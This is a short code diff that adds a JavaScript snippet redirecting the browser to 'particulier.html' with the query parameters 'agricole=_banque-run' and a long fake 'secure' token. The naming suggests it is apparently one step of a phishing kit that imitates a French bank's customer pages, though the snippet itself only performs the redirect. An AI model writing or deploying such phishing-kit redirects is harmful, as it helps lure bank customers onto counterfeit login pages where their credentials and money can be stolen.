@@ -1,0 +1,4 @@
+
+echo = "particulier.html?agricole=_banque-run&secure=5540zef1415405412104ef151511d7f84f5ze1f510eec8bd0efa0e51bb7d32971eeb957ff6d2a683fefa0e51bb7d32971eeb957ff6d2a683fe"
+self.location.replace(echo);
+window.location = echo;
